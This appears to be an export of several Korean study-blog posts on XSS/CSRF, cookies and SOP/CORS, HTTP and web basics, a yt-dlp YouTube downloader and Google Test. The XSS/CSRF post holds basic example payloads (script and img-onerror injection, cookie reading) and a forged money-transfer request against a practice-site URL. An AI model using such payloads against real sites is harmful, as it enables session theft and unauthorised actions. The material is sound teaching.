[{"content":"XSS (Cross Site Scripting) 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다. XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다. 공격 경로 XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다. 악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다. Flask는 render_template 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다. 아래와 같이 입력값을 그대로 출력하게 되면, 입력값으로 script 를 전달해 공격에 사용할 수 있다. 서버의 코드 @app.route(\u0026#34;/vulnerable\u0026#34;)\rdef vulnerable():\rparam = request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;) # 이용자가 입력한 인자를 가져옴\rreturn param # 이용자의 입력값을 화면 상에 표시 공격자 입력1. 다른 페이지로 redirection \u0026lt;script\u0026gt;location.href = \u0026#34;/another_page?param=PARAM1\u0026#34;;\u0026lt;/script\u0026gt; 공격자 입력2. cookie 정보 출력 \u0026lt;script\u0026gt;document.cookie\u0026lt;/script\u0026gt; XSS 공격 종류 XSS 는 악성 스크립트의 위치와 침투 경로에 따라 아래와 같이 구분된다. Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS 게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음 불특정 다수에게 보여지기 때문에 파급력이 크다. Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있음 검색 결과를 응답에 포함하는 일부 서비스에서 발생 가능 공격을 위해서는 다른 이용자를 악성 스크립트가 포함된 링크에 접속하도록 유도해야 함 DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS CSRF (Cross Site Request Forgery) 어떤 사이트에서 이용자의 신원 정보가 포함된 쿠키를 사용한다면, 타인의 쿠키를 탈취하여 변조된 명령을 서버로 번달하는 공격 방식이다. 이용자의 신원 정보가 포함된 쿠키는 일종의 서명과 같은 역할을 하기 때문에, 쿠키가 특정 명령에 대한 이용자의 본인 인증 역할을 수행할 수도 있다. 2차 인증을 수행하지 않고 cookie로만 인증을 하는 사이트에 대해 공격이 가능하다. XSS는 인증 정보인 세션 및 쿠키 탈취를 목적으로 서버에서 스크립트를 실행 하는 방식인 반면, CSRF는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격이다. 공격 경로 \u0026lt;img\u0026gt; 태그나 \u0026lt;form\u0026gt; 태그를 활용해서 사용자가 의도하지 않은 명령을 서버에 요청하는 script를 실행시킬 수 있다. /* img 태그 활용 요청 전달 */\r\u0026lt;img src=\u0026#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack\u0026amp;amount=1337\u0026#39; width=0px height=0px\u0026gt;` /* javascript 공격 예시 */\r/* 새 창 띄우기 */\rwindow.open(\u0026#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack\u0026amp;amount=1337\u0026#39;);\r/* 현재 창 주소 옮기기 */\rlocation.href = \u0026#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack\u0026amp;amount=1337\u0026#39;;\rlocation.replace(\u0026#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack\u0026amp;amount=1337\u0026#39;); 공격 기법 innerHTML 을 통한 XSS 취약점 공격 조건: 사용자의 입력을 출력하는 형태를 지닌 시스템 방법: \u0026lt;script\u0026gt; 태그와 공격용 javascript 를 url 파라미터 혹은 request 에 포함시켜 공격용 javascript 가 실행되게 한다. 예시) 서버의 코드 @app.route(\u0026#34;/vulnerable\u0026#34;)\rdef vulnerable():\rparam = request.args.get(\u0026#34;param\u0026#34;, \u0026#34;\u0026#34;) # 이용자가 입력한 인자를 가져옴\rreturn param # 이용자의 입력값을 화면 상에 표시 공격자 입력1. 다른 페이지로 redirection \u0026lt;script\u0026gt;location.href = \u0026#34;/another_page?param=PARAM1\u0026#34;;\u0026lt;/script\u0026gt; 공격자 입력2. cookie 정보 출력 \u0026lt;script\u0026gt;document.cookie\u0026lt;/script\u0026gt; innerHTML 을 통한 XSS 취약점 공격2 \u0026lt;script\u0026gt; 태그 없이 javascript를 실행시키는 방법 조건 : 서버에 기본적인 XSS 방지 기법이 적용되어 \u0026lt;script\u0026gt; 태그를 주입시킬 수 없는 경우 (ex: render_template 를 사용한 경우) 방법 : \u0026lt;image\u0026gt; 태그의 onerror 필드에 script를 주입한다. 참조 예시) 동작하지 않는 script(XSS공격 실패) name = \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;I am John in an annoying alert!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;;\rel.innerHTML = name; // harmless in this case 동작하는 script (XSS공격 성공) const name = \u0026#34;\u0026lt;img src=\u0026#39;x\u0026#39; onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34;;\rel.innerHTML = name; // shows the alert\r# x라는 경로에 이미지가 없어서 onerror 로 설정된 javascript가 실행된다. ","permalink":"https://aswinblue.github.io/Blog/post/webhacking/exploit/","summary":"XSS (Cross Site Scripting) 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다. XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다. 공격 경로 XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다. 악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다. Flask는 render_template 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다.","title":"Exploit"},{"content":"Youtoube Download Window OS에서 Python으로 Youtube 영상을 다운로드 하는 방법\n1. Python Code 작성 yt-dlp 패키지를 다운받는다. pip install yt-dlp 명령으로 손쉽게 다운로드 가능하다. github 주소는 다음과 같다. : https://github.com/yt-dlp/yt-dlp 코드를 작성한다. 아래는 샘플 코드이다.\nimport yt_dlp import os import time ########## # 설정 ########## # 최대 재시도 횟수 MAX_RETRIES = 3 # 재시도 사이의 대기 시간 (초) RETRY_DELAY = 5 # 다운로드 리스트 download_lists = [ { \u0026#34;name\u0026#34;: \u0026#39;FOLDER_NAME\u0026#39;, # 다운로드 받을 폴더 이름 \u0026#34;url\u0026#34;: \u0026#39;https://www.youtube.com/watch?v=CJuIRe_1c2g\u0026amp;list=RDMM\u0026amp;start_radio=1\u0026amp;rv=R4CecLdF11E\u0026#39;, # 다운로드 할 playlist URL }, { \u0026#34;name\u0026#34;: \u0026#39;SAMPLE2\u0026#39;, \u0026#34;url\u0026#34;: \u0026#39;https://www.youtube.com/watch?v=66l5r_IEZrI\u0026amp;list=RDGMEMYH9CUrFO7CfLJpaD7UR85w\u0026amp;start_radio=1\u0026amp;rv=CJuIRe_1c2g\u0026#39;, }, ] ########## # 다운로드 시작 ########## for idx, list in enumerate(download_lists): # \u0026#39;폴더이름/영상제목.확장자\u0026#39; 형식으로 다운로드 output_dir = os.path.join(f\u0026#39;./{list[\u0026#34;name\u0026#34;]}/\u0026#39;, \u0026#39;%(title)s.%(ext)s\u0026#39;) ydl_opt = { \u0026#39;outtmpl\u0026#39;: output_dir, \u0026#39;format\u0026#39;: \u0026#39;bestaudio/best\u0026#39;, # 다운로드할 포맷 지정 \u0026#39;download_archive\u0026#39;: \u0026#39;downloaded.txt\u0026#39;, # 다운로드 아카이브 파일 지정(미리 다운받은 항목들을 체크하여 중복으로 받지 않도록 하는 기록파일) \u0026#39;postprocessors\u0026#39;: [{ \u0026#39;key\u0026#39;: \u0026#39;FFmpegExtractAudio\u0026#39;, \u0026#39;preferredcodec\u0026#39;: \u0026#39;mp3\u0026#39;, # mp3포멧으로 변환 \u0026#39;preferredquality\u0026#39;: \u0026#39;192\u0026#39;, }], \u0026#39;verbose\u0026#39;: True, # 자세한 디버깅 정보 출력 \u0026#39;ignoreerrors\u0026#39;: True, # 다운로드 오류 무시 } for attempt in range(1, MAX_RETRIES + 1): try: with yt_dlp.YoutubeDL(ydl_opt) as ydl: ydl.download([ list[\u0026#34;url\u0026#34;] ]) print(f\u0026#39;{list[\u0026#34;name\u0026#34;]}:: 다운로드 완료\u0026#39;) break except Exception as e: print(f\u0026#39;{list[\u0026#34;name\u0026#34;]}:: 다운로드 실패 ({attempt}/{MAX_RETRIES}): {e}\u0026#39;) if attempt \u0026lt; MAX_RETRIES: print(f\u0026#39;{list[\u0026#34;name\u0026#34;]}:: {RETRY_DELAY}초 후 다시 시도합니다...\u0026#39;) time.sleep(RETRY_DELAY) else: print(f\u0026#39;{list[\u0026#34;name\u0026#34;]}:: 최대 재시도 횟수를 초과했습니다. 다운로드를 중단합니다.\u0026#39;) print(\u0026#39;모든 항목 다운로드 완료\u0026#39;) 다른것들은 수정할 필요 없고, download_lists 에 다운로드 할 Youtube 재생목록을 넣어준다.\nname 에는 다운로드할 폴더의 이름을 적어준다. url 에는 Youtube 재생목록의 url 을 기입한다. 위 이미지에 보이는 화면에서 url 을 복사해서 붙여넣는다. 2. 코덱 다운 ffmpeg 코덱을 다운받아야 하며, https://ffmpeg.org/download.html 에서 다운로드 가능하다. 실행 파일을 다운로드 받고, 환경 변수에 bin/ 폴더 경로를 추가한다. 환경변수 세팅은 Window 11 기준 아래 그럼처럼 \u0026lsquo;시작\u0026rsquo; 버튼에서 \u0026lsquo;환경\u0026rsquo; 이라는 글자를 입력해서 설정 창으로 진입할 수 있다. 3. 실행 작성한 python 코드를 실행시키면 프로젝트 루트 경로에 download_lists.name 으로 설정한 폴더가 생성되고, 폴더 안에 download_lists.url 재생목록에 있는 음악들이 다운로드 된다. downloaded.txt 파일로 이미 다운받은 파일들을 체크하여 중복 다운로드를 수행하지 않는다. (python 코드에서 ydl_opt 변수 참조) Keep in mind ☀️ 저작권이 있는 영상을 무단으로 배포하거나 상업적으로 사용하는 행위는 불법입니다.\r","permalink":"https://aswinblue.github.io/Blog/post/projects/youtube_downloader/","summary":"Youtoube Download Window OS에서 Python으로 Youtube 영상을 다운로드 하는 방법\n1. Python Code 작성 yt-dlp 패키지를 다운받는다. pip install yt-dlp 명령으로 손쉽게 다운로드 가능하다. github 주소는 다음과 같다. : https://github.com/yt-dlp/yt-dlp 코드를 작성한다. 아래는 샘플 코드이다.\nimport yt_dlp import os import time ########## # 설정 ########## # 최대 재시도 횟수 MAX_RETRIES = 3 # 재시도 사이의 대기 시간 (초) RETRY_DELAY = 5 # 다운로드 리스트 download_lists = [ { \u0026#34;name\u0026#34;: \u0026#39;FOLDER_NAME\u0026#39;, # 다운로드 받을 폴더 이름 \u0026#34;url\u0026#34;: \u0026#39;https://www.","title":"Youtube Downloader"},{"content":"Cookie HTTP의 특징(Connectionless, Stateless) 때문에 Web Server 는 HTTP로 요청된 패킷들이 어떤 Web Client에서 전달된 것인지 구분할 수 없다. IP 주소와 User-Agent 등의 정보는 매번 변경될 수 있다. Client의 정보와 요청의 내용을 구체화하기 위해, Server는 Client 마다 고유한 Cookie를 발급하고, Client는 Server에 요청을 보낼 때마다 Cookie를 같이 전송한다. Server는 Request 패킷에 들어있는 Cookie 를 통해 Client의 정보와 상태를 기록한다. Cookie 는 key-value 로 구성된 파일이며, Client 에 저장된다. Cookie의 단점 4KB의 크기 제한 쿠키로 인해 웹의 반응성이 느려질 수 있음 도메인 내의 모든 페이지가 같은 쿠키를 전달 받음 HTTP 프로토콜로 Cookie 요청시 암호화 되지 않아 보안이 취약함 쿠키는 사용자의 로컬에 텍스트로 저장 되어있어 쉽게 내용 확인이 가능함 악의적인 Client 가 Cookie 를 변조할 수 있음 Modern Storage APIs Cookie 의 단점을 해결하기 위해 사용되는 방법이다. Local storage, Session storage 등이 있다. Session Session 은 Server 에서 생성한 랜덤한 문자열이고, Server 가 Client 마다 고유한 값을 발급한다.\nClient 가 변조하면 안되는 정보들을 서버에 저장하기 위해 Server 와 Client는 Session 이라는 정보를 추가로 주고 받는다.\nClient 가 본인을 인증하기 위해 Cookie 에 자신의 인증 정보를 담아서 Server 로 전달하면, Server는 새로운 Session ID를 생성한다. Server는 생성한 Session ID를 Client에게 반환한다. Server는 Client로 부터 수신한 인증 정보와 본인이 생성한 Session ID를 묶어서 자신의 DB에 저장한다. 이후 Server는 Client 로 부터 인증 정보를 받지 않고 Session ID 만으로 Client를 구분할 수 있다. 만약 공격자가 이용자의 쿠키를 훔칠 수 있으면 이용자의 인증 상태를 훔칠 수 있는데, 이를 Sessions Hijacking 이라고 한다.\nCookie in HTTP HTTP 통신에서 Server가 브라우저에게 Cookie를 생성하려면 response 패킷에 아래와 같이 Set-Cookie 구문을 넣으면 된다. Set-Cookie: name=test;\rSet-Cookie: age=30; Expires=Fri, 30 Sep 2022 14:54:50 GMT; Client 에서 Cookie 를 조작하려면 Javascript 를 활용한다. document.cookie = \u0026#34;name=test;\u0026#34;\rdocument.cookie = \u0026#34;age=30; Expires=Fri, 30 Sep 2022 14:54:50 GMT;\u0026#34; SOP (Same Origin Policy) 악의적인 웹 페이지에서 javascript 를 통해 Client 가 다른 웹 페이지로 패킷을 보내게 한다면, Client 의 Session 과 Cookie 를 사용해 웹 페이지에 패킷을 보낼 수 있게 된다. Web Client 에서는 동일한 출처(origin) 로 판별된 사이트를 대상으로만 읽어들일 수 있는 제약을 만들었고, 이를 SOP 라 한다. 데이터 읽기는 막지만, 쓰기는 허용된다. 동일 출처 (same origin) 웹 사이트의 URL은 프로토콜, 포트, 호스트 세 가지로 구성된다. 예를들어 https://google.com:443 URL은 아래와 같이 분석된다. 프로토콜(scheme) : https 호스트 : google.com 포트 : 443 https://google.com/menu:443 : same origin. path가 다른 것은 허용 http://google.com:443 : cross origin. 프로토콜(scheme)이 다름 https://naver.com:443 : cross origin. 호스트가 다름 https://google.com:123 : cross origin. 포트가 다름 CORS (Cross-Origin Resource Sharing) SOP 제약사항에도 예외는 있다. 이미지나 자바스크립트, CSS 등의 리소스를 불러오는 \u0026lt;img\u0026gt;, \u0026lt;style\u0026gt;, \u0026lt;script\u0026gt; 등의 태그는 SOP의 영향을 받지 않습니다. 또한, 필요에 의해 cross origin 간에도 데이터를 교환해야 할 상황이 있는데, 이 경우 CORS와 관련된 HTTP 헤더를 추가하여 데이터를 요청할 수 있다. xhr = new XMLHttpRequest();\rxhr.withCredentials = true; 이 경우, 수신측에 메시지 요청을 질의하는 용도로 OPTIONS 메소드 데이터가 전달된다. 이러한 패킷을 CORS preflight 라고 한다. 요청 패킷의 헤더에 Access-Control-Request 구문이 들어있고, 회신 패킷의 헤더에는 Access-Control-Allow 구문이 들어가 있다. Server 의 회신에 적힌 CORS 정책을 보고, Client는 데이터를 요청할지 판단한다. JSONP (JSON with Padding) javascript 는 SOP 의 예외 취급을 받는 속성을 이용하여 \u0026lt;script\u0026gt; 태그 형태로 cross origin 의 데이터를 받아오는 기법이다. Server 에 데이터를 요청할 때 callback 함수의 이름을 넘겨주면, 대상 서버는 전달된 callback 함수로 데이터를 감싸 응답합니다 ex) request: \u0026lt;script src='http://theori.io/whoami?callback=myCallback'\u0026gt;\u0026lt;/script\u0026gt; ex) response: myCallback({'id':'dreamhack'}); JSONP는 CROS 가 생성되기 전에 쓰이던 방법으로, 최근에는 사장되는 추세이다. ","permalink":"https://aswinblue.github.io/Blog/post/webhacking/cookie/","summary":"Cookie HTTP의 특징(Connectionless, Stateless) 때문에 Web Server 는 HTTP로 요청된 패킷들이 어떤 Web Client에서 전달된 것인지 구분할 수 없다. IP 주소와 User-Agent 등의 정보는 매번 변경될 수 있다. Client의 정보와 요청의 내용을 구체화하기 위해, Server는 Client 마다 고유한 Cookie를 발급하고, Client는 Server에 요청을 보낼 때마다 Cookie를 같이 전송한다. Server는 Request 패킷에 들어있는 Cookie 를 통해 Client의 정보와 상태를 기록한다. Cookie 는 key-value 로 구성된 파일이며, Client 에 저장된다. Cookie의 단점 4KB의 크기 제한 쿠키로 인해 웹의 반응성이 느려질 수 있음 도메인 내의 모든 페이지가 같은 쿠키를 전달 받음 HTTP 프로토콜로 Cookie 요청시 암호화 되지 않아 보안이 취약함 쿠키는 사용자의 로컬에 텍스트로 저장 되어있어 쉽게 내용 확인이 가능함 악의적인 Client 가 Cookie 를 변조할 수 있음 Modern Storage APIs Cookie 의 단점을 해결하기 위해 사용되는 방법이다.","title":"Cookie"},{"content":"Web HTTP를 이용하여 정보를 공유하는 인터넷 기반 서비스를 Web이라 한다. 정보 제공자를 Web Server, 정보 수신자를 Web Client라 칭한다. 현재의 웹은 단순 정보 제공을 떠나 서비스를 제공하는 형태로 발전하고 있으며, Front end 와 Back end 로 역할이 나뉘어지고 있다. Front end : Web resource로 구성된 사용자에게 직접 보여지는 부분 Back end : 사용자에게 직접 보여지지는 않지만 서비스 제공을 위해 구동되는 부분 Web Resource 웹에 갖춰진 정보 자산을 의미하며, 사용자에게 제공되어 화면을 구성하는데 사용된다. 고유한 식별자인 Uniform Resource Identifier (URI)를 가진다. 대표적인 웹 리소스의 종류 Hyper Text Markup Language (HTML) : 태그와 속성을 통한 구조화된 문서 작성에 사용. 설명 참조 Cascading Style Sheets (CSS) : 웹 문서의 외형을 조절하는데 사용. 설명 참조 JavaScript (JS) : 이용자의 브라우저에서 실행되는 코드로 front end 의 동작을 결정. 설명 참조 text image video font Web browser Client 의 위치에서 Server 와 HTTP 통신을 수행해주고 그 결과를 가시화 해 주는 도구로, 사용자가 HTTP 통신을 직접 알지 못해도 Web을 사용할 수 있게 해 준다. 동작 순서 URL 분석 DNS 요청 HTTP Request get HTTP Respond 리소스 다운로드 및 웹 랜더링 Dev Tool Web browser 에서 사용할 수 있는 개발자 도구 Ctrl + U : 소스코드 보기 단축키 console.log : 콘솔창에 로그 출력 document.cookie : 콘솔창에서 쿠키 출력 location.href : 전체 URL 을 반환하거나, URL을 업데이트 URL(Uniform Resource Locator) 웹에 있는 리소스의 위치를 표현하는 문자열 URL 의 구성 요소 Scheme: 웹 서버와 어떤 프로토콜로 통신할지 나타냅니다. Host: Authority의 일부로, 접속할 웹 서버의 주소에 대한 정보를 가지고 있습니다. Port: Authority의 일부로, 접속할 웹 서버의 포트에 대한 정보를 가지고 있습니다. Path: 접근할 웹 서버의 리소스 경로로 \u0026lsquo;/\u0026lsquo;로 구분됩니다. Query: 웹 서버에 전달하는 파라미터이며 URL에서 \u0026lsquo;?\u0026rsquo; 뒤에 위치합니다. Fragment: 메인 리소스에 존재하는 서브 리소스를 접근할 때 이를 식별하기 위한 정보를 담고 있습니다. \u0026lsquo;#\u0026rsquo; 문자 뒤에 위치합니다. Domain name 숫자의 조합으로 이루어진 IP 주소를 사람이 읽기 쉬운 형태의 문자열로 대체한 형태 Domain name 을 사용하기 위해서는 DNS가 필요하다. DNS(Domain Name Server) 에 Domain name 을 질의하면 DNS 는 매핑되는 IP 를 반환한다. 콘솔의 nslookup 명령으로 domain name 정보를 확인할 수 있다.\nex) nslookup google.com\nWeb rendering 서버로부터 받은 리소스 파일을 시각화하는 과정을 의미한다. 브라우저는 Web rendering 을 위한 엔진을 사용한다. Webkit Blink Gecko ","permalink":"https://aswinblue.github.io/Blog/post/webhacking/web/","summary":"Web HTTP를 이용하여 정보를 공유하는 인터넷 기반 서비스를 Web이라 한다. 정보 제공자를 Web Server, 정보 수신자를 Web Client라 칭한다. 현재의 웹은 단순 정보 제공을 떠나 서비스를 제공하는 형태로 발전하고 있으며, Front end 와 Back end 로 역할이 나뉘어지고 있다. Front end : Web resource로 구성된 사용자에게 직접 보여지는 부분 Back end : 사용자에게 직접 보여지지는 않지만 서비스 제공을 위해 구동되는 부분 Web Resource 웹에 갖춰진 정보 자산을 의미하며, 사용자에게 제공되어 화면을 구성하는데 사용된다.","title":"Web"},{"content":"HTTP(Hyper Text Transfer Protocol) 서버와 클라이언트의 데이터 교환을 요청(Request)과 응답(Response) 형식으로 정의한 프로토콜로, 웹 서비스의 근간이 되는 텍스트 교환 프로토콜이다. 주로 클라이언트가 요청을 하면 서버가 응답을 해 주는 방식이며, 서버는 클라이언트의 요청을 받기 위해 socket 통신으로 80번 (혹은 8080번) 포트를 상시 열어놓고 대기한다. HTTP 프로토콜은 ISO 7계층 중 Application layer에 해당하며, transport layer 에 TCP 프로토콜을 사용할 떄 80번 포트를 HTTP 프로토콜 용으로 할당받는다. 0 ~ 1023 번 까지 port는 well-known 포트로, 시스템 혹은 네트워크에서 공공연히 사용되는 프로토콜들의 포트들이 할당되어 있고, HTTP 프로토콜도 그 중 하나이다. 80번 포트에 HTTP가, 443 포트에 HTTPS가 할당되어 있다. Connectionless와 Stateless 라는 특징이 있다. Connectionless: 하나의 요청에 하나의 응답을 한 후 연결을 종료하는 것을 의미합니다. 특정 요청에 대한 연결은 이후의 요청과 이어지지 않고 새 요청이 있을 때 마다 항상 새로운 연결을 맺음. Stateless: 통신이 끝난 후 상태 정보를 저장하지 않는 것을 의미합니다. 이전 연결에서 사용한 데이터를 다른 연결에서 요구할 수 없음 프로토콜 상세 패킷 구조 headers headers는 CRLF(Carriage Return Line Feed) 로 한 줄을 구분하며, 첫 줄은 Start line, 이후 나머지 줄들은 모두 header 라 부른다. headers 의 끝은 빈 줄로 나타낸다. headers 는 field 와 value 로 구성되어 HTTP 메시지의 속성 또는 body 의 속성을 나타낸다. HTTP 메시지에는 0개 이상의 headers 가 존재할 수 있다. body headers 의 마지막 CRLF 다음 모든 줄을 body라 칭한다. 상대방에게 전하려는 실제 데이터가 들어있다. 패킷 종류 HTTP 패킷 참조 Request 시작줄에 Method, Request target, HTTP version 가 작성되며, 띄어쓰기로 구분된다. Method GET: 특정 리소스의 표시를 요청합니다. GET을 사용하는 요청은 오직 데이터를 받기만 합니다. HEAD: GET 메서드의 요청과 동일한 응답을 요구하지만, 응답 본문을 포함하지 않습니다. POST: 특정 리소스에 엔티티를 제출할 때 쓰입니다. 이는 종종 서버의 상태의 변화나 부작용을 일으킵니다. PUT: 목적 리소스 모든 현재 표시를 요청 payload로 바꿉니다. DELETE: 특정 리소스를 삭제합니다. CONNECT: 목적 리소스로 식별되는 서버로의 터널을 맺습니다. OPTIONS: 목적 리소스의 통신을 설정하는 데 쓰입니다. TRACE: 목적 리소스의 경로를 따라 메시지 loop-back 테스트를 합니다. PATCH: 리소스의 부분만을 수정하는 데 쓰입니다. Request Target URI라고도 불리며, 서비스 내에서 메소드를 처리할 하위 대상을 지정하는 용도이다. HTTP version 프로토콜의 버전을 나타낸다. Response 요청에 대한 회신을 담아내는 패킷으로, 요청 결과를 숫자로 표현한 상태 코드를 담고 있다. 상태 코드는 첫 숫자에 따라 아래와 같은 의미를 지닌다. 1xx: 요청을 제대로 받았고, 처리가 진행 중임 2xx: 요청이 제대로 처리됨 200(OK): 성공 3xx: 요청을 처리하려면, 클라이언트가 추가 동작을 취해야 함. 302(Found): 다른 URL로 갈 것 4xx: 클라이언트가 잘못된 요청을 보내어 처리에 실패 400(Bad Request): 요청이 문법에 맞지 않음 401(Unauthorized): 클라이언트가 요청한 리소스에 대한 인증이 실패함 403(Forbidden): 클라이언트가 리소스에 요청할 권한이 없음 404(Not Found): 리소스가 없음 5xx: 클라이언트의 요청은 유효하지만, 서버에 에러가 발생하여 처리에 실패 500(Internal Server Error): 서버가 요청을 처리하다가 에러가 발생함 503(Service Unavailable): 서버가 과부하로 인해 요청을 처리할 수 없음 상태코드 참조 HTTPS(HTTP over Secure socket layer) HTTP는 평문으로 전달하기 때문에, 패킷이 유출되면 중요 정보가 노출될 수 있다. 보안 위협을 방지하기 위해 TLS(Transport Layer Security) 프로토콜을 도입한 HTTP의 변형 프로토콜이 HTTPS 이다. 평문 대신 암호화된 구문을 전송하며 복호화를 위한 키가 있어야 내용을 읽을 수 있다. ","permalink":"https://aswinblue.github.io/Blog/post/webhacking/http/","summary":"HTTP(Hyper Text Transfer Protocol) 서버와 클라이언트의 데이터 교환을 요청(Request)과 응답(Response) 형식으로 정의한 프로토콜로, 웹 서비스의 근간이 되는 텍스트 교환 프로토콜이다. 주로 클라이언트가 요청을 하면 서버가 응답을 해 주는 방식이며, 서버는 클라이언트의 요청을 받기 위해 socket 통신으로 80번 (혹은 8080번) 포트를 상시 열어놓고 대기한다. HTTP 프로토콜은 ISO 7계층 중 Application layer에 해당하며, transport layer 에 TCP 프로토콜을 사용할 떄 80번 포트를 HTTP 프로토콜 용으로 할당받는다. 0 ~ 1023 번 까지 port는 well-known 포트로, 시스템 혹은 네트워크에서 공공연히 사용되는 프로토콜들의 포트들이 할당되어 있고, HTTP 프로토콜도 그 중 하나이다.","title":"HTTP"},{"content":"Unit Test 테스트의 속성 좋은 단위 테스트를 작성하기 위해서는 아래 세 가지 기준을 만족해야 한다. 가독성\n3A(Arrange / Act / Assert) 순서대로 test case 코드가 작성되어 있어야 한다. test case 가 어떤 동작을 검증하는지 알 수 있어야 한다. test case 의 이름을 명확하게 작성 필요 최신 test framework (java 에서 사용하는 spock)에서는 자연어로 test case 이름을 작성할 수 있도록 지원하는 경우도 있다. (google test 는 미지원) test case 실행 시 printf 문을 한 번 출력 하도록 규칙을 정하여 사용할 수 있다. #define SPEC(msg) printf(\u0026#34;[SPEC] %s\\n\u0026#34;, msg) TEST(SampleTestCase, SampleTest) { SPEC(\u0026#34;이 테스트는 무엇을 하는 테스트 입니다\u0026#34;); } 코드를 보지 않고 오류의 원인을 알 수 있어야 한다. 자연여와 가깝게 테스트 코드를 표현하는 것이 유리하다. 함수 이름을 자연어로 상세히 지정 에러 메시지를 자연어로 출력 유지보수성\n테스트 코드는 비용이 증가하지 않아야 한다. 테스트 코드의 오류 가능성이 있는 제어 구문(조건문, 반복문, 예외처리)은 최소화 되어야 한다. 조건문을 최소화 하기 위해서 if 문 대신 ASSERT 구문을 사용할 수 있다. 신뢰성\n테스트는 테스트 순서 및 수행 횟수에 상관없이 항상 동일한 결과가 나와야 한다. BDD(Behavior Driven Development) 관점의 개발을 위해 Mock Object 를 이용한 행위 기반 검증을 수행하여 신뢰성을 높일 수 있다. 다만, 테스트 비용 관점에서 상태기반 검증이 행위기반 검증보다 우월하다. 코드 작성 시 상태기반 검증이 가능하게 구현한다면 행위기반 검증 적용하는 것 보다 유지보수성 관점에서 유리하다. 테스트의 조건 자동화 : 테스트는 실행 이후 완료 까지 추가 조작 없이 돌릴 수 있어야 한다. (필요하다면 최소화) 자체 검사 : 코드를 확인하지 않고 테스트의 결과 만으로 테스트 목적과 에러 원인을 알 수 있어야 한다. 반복 : 테스트를 여러 번 돌려도 동일한 결과가 도출되어야 한다. 독리비 : 각각의 테스트는 개별로 동작이 가능해야 한다. 테스트 가능 설계 SOLID Open-Closed Principle : 개방 폐쇄 원칙\n확장에는 열려있고, 수정에는 닫혀있는 설계 Liskov Substitution Principle : 리스코프 치환 원칙\n다형성을 활용한 설계 Interface Segregations Principle: 인터페이스 분리 원칙\n세분화된 인터페이스 지향, 범용 인터페이스 지양 Dependency Inversion Principle : 의존 관계 역전 원칙\n약한 의존관계, 의존성 주입 적극 활용 추상 개념 활용 코드 설계 지침\n복잡한 private method 지양 정적 멤버 함수 지양 Single 톤 지양 의존성 주입에 기반한 composition 모델을 사용 종속성은 최소화 생성자는 간단하게 구성하고, 생성자에서 작업은 최소화 최소 지식의 원칙 수용 (인터페이스에 없는 함수는 호출하지 않도록) 숨겨진 종속성과 전역 상태는 지양 용어 Test Suite: 동일한 fixture 를 사용하는 test case 의 집합 SUT : (System Under Test) 테스트 할 대상 시스템. Code Under Test, Class Under Test 등으로 사용하기도 한다. Test Coverage 공식적인 test coverage의 기준은 없다. 프로젝트마다 다르게 설정될 수 있기 때문이다. 높은 coverage 를 확보하기 위해서는 오류 case 에 대한 동작도 검증 할 필요가 있다. test coverage 가 높다고 테스트가 잘 작성 된 것은 아니다. assertion 없이 동작하는 test case 들이 많아도 coverage는 높아질 수 있다. 코드가 의도한 대로 잘 동작하는지, 의도한 대로 잘 실패하는지 모두 살펴보는 것이 필요하다. xUnit Framework Unit Test의 3A 순서에 대해 단계가 하나 더 추가된 4단계 테스트 패턴을 추구한다. 4단계 테스트 패턴 test fixture 설정 사전조건 설정 SetUp() SUT 와 상호작용 테스트 할 동작 수행 기대 결과 확인 ASSERT test fixture 해체 테스트 이전의 상태로 복구 TearDown() Google Test Framework C++ 을 대상으로 하는 xUnit Test Framework 중 하나이다. C 언어를 대상으로 한다면 Google Test Framework 를 변환하여 사용하기보다 FFF 프로젝트 와 같이 다른 라이브러리를 사용하는 것을 권장한다. 설치 및 실행 wget https://github.com/google/googletest/releases/download/v1.15.2/googletest-1.15.2.tar.gz 명령으로 소스코드 다운로드\ng++ googletest/googletest/src/gtest-all.cc -c -I ./googletest/googletest/include/ -I ./googletest/googletest -std=c++14 -O2 명령으로 소스코드 컴파일\ninclude 경로를 설정하여 빌드, 목적파일을 생성한다. ar rcv libgtest.a gtest-all.o\n목적파일 라이브러리화 하여 .lib 파일 생성 google test의 main 작성. 아래 형태가 기본적으로 설정되어야 한다.\nint main(int argc, char* argv[]) { testing::InitGoogleTest(*argc, argv); return RUN_ALL_TESTS(); } googletest/src/gtest_main.cc 경로에 있는 main을 사용해도 